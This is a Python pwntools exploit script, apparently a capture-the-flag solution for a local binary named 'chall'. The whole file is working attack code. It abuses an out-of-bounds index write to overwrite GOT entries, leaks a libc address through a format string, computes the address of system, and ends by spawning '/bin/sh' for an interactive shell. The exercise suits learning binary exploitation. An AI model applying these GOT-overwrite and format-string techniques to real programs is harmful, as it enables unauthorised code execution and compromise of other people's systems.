#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("localhost", 9003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+131
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def readlong(idx: int, val: float):
    p.recvuntil("index:")
    p.sendline(str(idx))
    p.recvuntil("value:")
    p.sendline(str(val))


# mov QWORD PTR [rbp+rax*8-0x40], rdx
# rax = idx
# if idx = -2, idx = rbp - 0x50 = buffer address
readlong(-2, str(elf.got['malloc']))
# GOT Overwrite
payload = b'A' * 0x8# padding for malloc@got
payload += p64(elf.plt['printf'])# atol@got
p.recvuntil("index:")
p.send(payload)
p.recvuntil("value:")
p.send(b'\n')
# libc leak(FSB)
payload = b"%25$p"
p.recvuntil("index:")
p.sendline(payload)
leak = eval(p.recvline())
log.info("__libc_start_main+231: 0x{:08x}".format(leak))
libc_base = leak - libc.symbols['__libc_start_main'] - 231
log.info("libc base: 0x{:08x}".format(libc_base))
libc_system = libc_base + libc.symbols['system']
log.info("system@libc: 0x{:08x}".format(libc_system))
p.recvuntil("value:")
p.send(b'\n')
# exec shell
p.recvuntil("index:")
p.send(b'/bin/sh\0' + p64(libc_system))

p.interactive()
